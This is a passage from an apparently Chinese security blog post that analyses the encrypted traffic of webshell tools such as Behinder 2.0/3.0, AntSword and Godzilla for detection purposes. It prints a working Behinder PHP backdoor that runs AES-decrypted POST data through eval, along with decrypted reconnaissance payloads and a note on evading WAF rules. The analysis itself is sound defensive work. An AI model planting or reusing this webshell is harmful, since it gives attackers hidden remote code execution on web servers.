class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;<span class="variable">$content</span>=<span class="string">&quot;6076b8c3-852b-4d8d-b841-1c3103a5f956&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<p>响应包aes解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;NjA3NmI4YzMtODUyYi00ZDhkLWI4NDEtMWMzMTAzYTVmOTU2&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在很多厂商已经对返回的内容进行匹配。所以这种动态加密的方式会在冰蝎3取消</p>
+</li>
+<li><p>第四次POST请求</p>
+<p>请求体解密,phpinfo()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>(); <span class="title function_ invoke__">phpinfo</span>(); <span class="variable">$info</span> = <span class="title function_ invoke__">ob_get_contents</span>(); <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    <span class="variable">$driveList</span> =<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(PHP_OS,<span class="string">&quot;windows&quot;</span>)||<span class="title function_ invoke__">stristr</span>(PHP_OS,<span class="string">&quot;winnt&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">65</span>;<span class="variable">$i</span>&lt;=<span class="number">90</span>;<span class="variable">$i</span>++)</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="variable">$drive</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;:/&#x27;</span>;</span><br><span class="line">    		<span class="title function_ invoke__">file_exists</span>(<span class="variable">$drive</span>) ? <span class="variable">$driveList</span>=<span class="variable">$driveList</span>.<span class="variable">$drive</span>.<span class="string">&quot;;&quot;</span>:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$driveList</span>=<span class="string">&quot;/&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$currentPath</span>=<span class="title function_ invoke__">getcwd</span>();</span><br><span class="line">    <span class="comment">//echo &quot;phpinfo=&quot;.$info.&quot;\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\n&quot;.&quot;driveList=&quot;.$driveList;</span></span><br><span class="line">    <span class="variable">$osInfo</span>=PHP_OS;</span><br><span class="line">    <span class="variable">$result</span>=<span class="keyword">array</span>(<span class="string">&quot;basicInfo&quot;</span>=&gt;<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$info</span>),<span class="string">&quot;driveList&quot;</span>=&gt;<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$driveList</span>),<span class="string">&quot;currentPath&quot;</span>=&gt;<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$currentPath</span>),<span class="string">&quot;osInfo&quot;</span>=&gt;<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$osInfo</span>));</span><br><span class="line">    <span class="comment">//echo json_encode($result);</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">    <span class="comment">//echo json_encode($result);</span></span><br><span class="line">    <span class="comment">//echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key);</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>), <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">main</span>();</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="冰蝎3-0流量分析"><a href="#冰蝎3-0流量分析" class="headerlink" title="冰蝎3.0流量分析"></a>冰蝎3.0流量分析</h4><h6 id="后门代码"><a href="#后门代码" class="headerlink" title="后门代码"></a>后门代码</h6><p>与2.0版本相比对密码进行了md5的加密，少了一个响应随机生成16位字符key的功能</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">	<span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="wireshark抓包分析"><a href="#wireshark抓包分析" class="headerlink" title="wireshark抓包分析"></a>wireshark抓包分析</h6><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220908154800432.png" alt="image-20220908154800432"></p>
+<h6 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h6><p>分析流量发现相比2.0少了动态密钥的获取的请求，aes密钥变为 <code>md5(&quot;pass&quot;)[0:16]</code> 意思就是为32位md5的前16位。全程不再交互密钥生成。一共就俩次请求，第一次请求为判断是否可以建立连接，少了俩次get获取冰蝎动态密钥的行为，第二次发送phpinfo等代码执行，获取网站的信息。</p>
+<ol>
+<li><p>第一次POST请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /shell.php HTTP/1.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://127.0.0.1/A8.php</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:79.0) Gecko/20100101 Firefox/79.0</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 1432</span><br><span class="line"></span><br><span class="line">3Mn1yNMtoZViV5wotQHPJtwwj0F4b2lyToNK7LfdUnN7zmyQFfx/zaiGwUHg+8SlXZemCLBkDIvxiBIGd6bgOEiZtNpn6YmnWiiaCBNbXkC5JWFTARrD8lCOCQ4ZVFjsJFDaAOwzinbqne/oYuNwWjQvKM9ii2RE/b+Gc+ya2f4+OIDU2Wk/QSIL7GOAoyaUYZSq4bL2wmX5RnP1Lbf7S+TAy3K7JPruBiZeZGC/ay14vUj4+IgmNHwEAzWl3DNIsL1yhH4Do5FI8HwZpG5XnrZwpKdFIEgN4GKmcDODTdO2pj8DVXCwes3m+v/wRykVd++xsex2EkGn9p0SgL+GpXlGg6OlQscedjdgBXv15UyPfJude5BJv+j7cEF7zpdtyAnFYCSqiRX+XD7DNsIUVbU+oamjVwZCgr4L+bbRvs1NfjV6iKKs65VTnlSIbCArJv/w+axR9Gc7Jt9v/GBKckbRjefZGqx7UTKDMahYEBgrwpXrii28q/UerEq/VKFKKeHQuovmpvlx8CblMBkG+rHmhQrP7QVJuzSOUbwdWZpbhys2bufqT6hyOjsu/0sSmHdrzvlZgkRsnsNK0Kv56sesEx9AiwuvgxMh5gAi86uAfhQISoEU5jZNs/T0LiJksv6xddHsDoKSwx+2s74jiNNFh9p0AmUdDloXXvRrfJvCdfaTHnkDEOH6BcSyZj9r53ZKiQUHPh7Sd13x/bk7zcKrUubSplf5cFLc+7m2nSWkXM1Ei7GVkZKBvKorowWkuS0katSgEt3WN00g95HyDfGdxZyUIthJ9hIETiP81O67weGqjFraZfXQUuOHNibydSrZTj/1La6OqSSHoAVnghH9TbYzM4lDdppSZJ1j5eWx8CVn+E8LeCyeROLhKix+P9yJh72FbLOoMFvCurzarkbYZrmQ7Qb0R1oOt2rKNFxY8/itqOSZdk/d2lFkZeT8sbzLmdMQBdSvP/WlvhRdgoYhdkYMfH+2YBJnLuuGgCaXJ0Ky0PpM6+076t6rbiQQQeZNXIMXEBI0Tj3HW3pUzfujkNq9eH0+MYndahOkMTmGSsloL4KLXxuzW2UHOd0giJV1LCFDyY+DlZ/h6mezAzXn7U8m+4uk+5hW3MlS1c3Z5seYa5YUvr/0fJlpswhcRNJCW8cqYNkrvhkx8qDodL6/3cjmjhqQPJEzJJGG6l0hF7vDByXs+2zE63uNlwhgrIDJgbiGOX3Ds6FaIiuCcQ/ZUtqA9W8sAQCdge6P+zJ1OoKVkNCpOhUb3e22MUXxtWH+1BdoR+S5aSN6NjcM4pKQrwXJ4xyV59kI9PUAjavw7DK+/Pf2wUFWCT2YVbObz+NLTxQ2r8QswTWp0kVLMSNIzOwbtWjUy+S9UAAPIVHPKmXRzplprChlH0wL9uCUO8L2htsaRM0Fpd7M8vrDyQ==</span><br></pre></td></tr></table></figure>
+
+<p>解密后</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">assert|<span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@error_reporting(0);</span></span><br><span class="line"><span class="string">function main($content)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	$result = array();</span></span><br><span class="line"><span class="string">	$result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span></span><br><span class="line"><span class="string">    $result[&quot;msg&quot;] = base64_encode($content);</span></span><br><span class="line"><span class="string">    $key = $_SESSION[&#x27;</span>k<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">    echo encrypt(json_encode($result),$key);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function encrypt($data,$key)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	if(!extension_loaded(&#x27;</span>openssl<span class="string">&#x27;))</span></span><br><span class="line"><span class="string">    	&#123;</span></span><br><span class="line"><span class="string">    		for($i=0;$i&lt;strlen($data);$i++) &#123;</span></span><br><span class="line"><span class="string">    			 $data[$i] = $data[$i]^$key[$i+1&amp;15]; </span></span><br><span class="line"><span class="string">    			&#125;</span></span><br><span class="line"><span class="string">			return $data;</span></span><br><span class="line"><span class="string">    	&#125;</span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">    	&#123;</span></span><br><span class="line"><span class="string">    		return openssl_encrypt($data, &quot;AES128&quot;, $key);</span></span><br><span class="line"><span class="string">    	&#125;</span></span><br><span class="line"><span class="string">&#125;$content=&quot;S3F0TTlUQjVsSkRGNnFlSHU2dEt0c0RzdzZlUWpWaUJobzRCMW9id0NlSzd2SzlEWFBaMENsSXpJVXh5aTFwMWxNa3VSd1k5YVJUQWZnNWkzS0JPQ3hsbWRpdGpHZkQ4dnlsMk9SenZ1T3hxZE5FOEVGaEs1TXF0S1hHcFZxSVIyeWJTY25weHZDWW93SnZ0&quot;;$content=base64_decode($content);</span></span><br><span class="line"><span class="string">main($content);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 解密第一次发送的数据查看，这里有一个参数为 $content 这个变量名称和里面的内容为随机生成的， 目的是为了绕过 $Content-Length ，这个已经在冰蝎2.0中已经被加入了Waf的检测规则当中，所以在冰蝎3.0当中用数据填充的方式绕过。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 08 Sep 2022 07:47:16 GMT</span><br><span class="line">Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">X-Powered-By: PHP/5.6.9</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Set-Cookie: PHPSESSID=j39c0oi2abaghm0b8h5ab7pmj3; path=/</span><br><span class="line">Keep-Alive: timeout=5, max=100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j42REBdjeI0ap/e4pavYx6svt2i0v0ZERdkwhGaPZ/VBGvP1Cw29Ic+DnwBtTxWec7IuOA8jFdHrujhbw+4sln0433D5aFZLZUmEL6LuWpl2caVaTnmhPj7pWvWPGafD8CsHA1kTk/zy6s6ik5IMIWJkDVTI3vlb4zy2y5Qomp0RDOjsYaeRkwQerekW7A0sZcCm4suP8/BO3J/W6pOaBUhYUKjVIB/zsvKBsBgz1pMpUMBLFSU8B1RApobdh5rzEsKseQXvj4HKy+3HwF72AKQ</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h4><h6 id="后门程序"><a href="#后门程序" class="headerlink" title="后门程序"></a>后门程序</h6><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><strong>AntSword：</strong></p>
+<table>
+<thead>
+<tr>
+<th>requests</th>
+<th>response</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>base64等方式</td>
+<td>明文</td>
+</tr>
+</tbody></table>
+<p><strong>冰蝎2.0：</strong></p>
+<table>
+<thead>
+<tr>
+<th>requests</th>
+<th>response</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>开启Openssl扩展-动态密钥aes加密</td>
+<td>aes加密+base64</td>
+</tr>
+<tr>
+<td>未开启Openssl扩展-异或</td>
+<td>异或+base64</td>
+</tr>
+</tbody></table>
+<p><strong>冰蝎3.0：</strong></p>
+<table>
+<thead>
+<tr>
+<th>requests</th>
+<th>response</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>开启Openssl扩展-静态密钥aes加密</td>
+<td>aes加密+base64</td>
+</tr>
+<tr>
+<td>未开启Openssl扩展-异或</td>
+<td>异或+base64</td>
+</tr>
+</tbody></table>
+<p><strong>哥斯拉：</strong></p>
+<table>
+<thead>
+<tr>
+<th>requests</th>
+<th>response</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php的为base64+异或+base64</td>
+<td>异或+base64+脏字符</td>
+</tr>
+<tr>
+<td>jsp的为Base64+AES</td>
+<td>aes+base64+脏字符</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9404">参考文章</a></p>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>Publish date：<a href="http://example.com/2022/09/08/%E5%86%B0%E8%9D%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">September 8th 2022, 5:47:19 pm</a>
+            <p>Update date：<a href="http://example.com/2022/09/08/%E5%86%B0%E8%9D%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">September 8th 2022, 5:48:27 pm</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2022/09/01/arm%20u%20chrome/" title="Arm U Chrome">
+                    <div class="prevTitle">Arm U Chrome</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:1611249603@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/s1eep1234" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                    
+                    <img class="profile-qr" src="/assets/wechat.png" />
+                </span>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                    
+                    <img class="profile-qr" src="/assets/qq.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:30vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81Webshell%E8%BF%9E%E6%8E%A5%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">常见Webshell连接工具流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91"><span class="toc-number">1.0.1.</span> <span class="toc-text">蚁剑</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E5%90%8E%E9%97%A8%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">1.0.1.0.1.</span> <span class="toc-text">网站后门一句话</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#wireshark%E6%8A%93%E5%8C%85"><span class="toc-number">1.0.1.0.2.</span> <span class="toc-text">wireshark抓包</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.0.1.0.3.</span> <span class="toc-text">连接过程分析</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90"><span class="toc-number">1.0.1.0.4.</span> <span class="toc-text">命令执行分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E2-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.0.2.</span> <span class="toc-text">冰蝎2.0流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%90%8E%E9%97%A8"><span class="toc-number">1.0.2.0.1.</span> <span class="toc-text">后门</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#wireshark%E6%8A%93%E5%8C%85-1"><span class="toc-number">1.0.2.0.2.</span> <span class="toc-text">wireshark抓包</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90-1"><span class="toc-number">1.0.2.0.3.</span> <span class="toc-text">连接过程分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E3-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.0.3.</span> <span class="toc-text">冰蝎3.0流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E4%BB%A3%E7%A0%81"><span class="toc-number">1.0.3.0.1.</span> <span class="toc-text">后门代码</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-number">1.0.3.0.2.</span> <span class="toc-text">wireshark抓包分析</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.0.3.0.3.</span> <span class="toc-text">流量分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">1.0.4.</span> <span class="toc-text">哥斯拉</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.0.4.0.1.</span> <span class="toc-text">后门程序</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.0.5.</span> <span 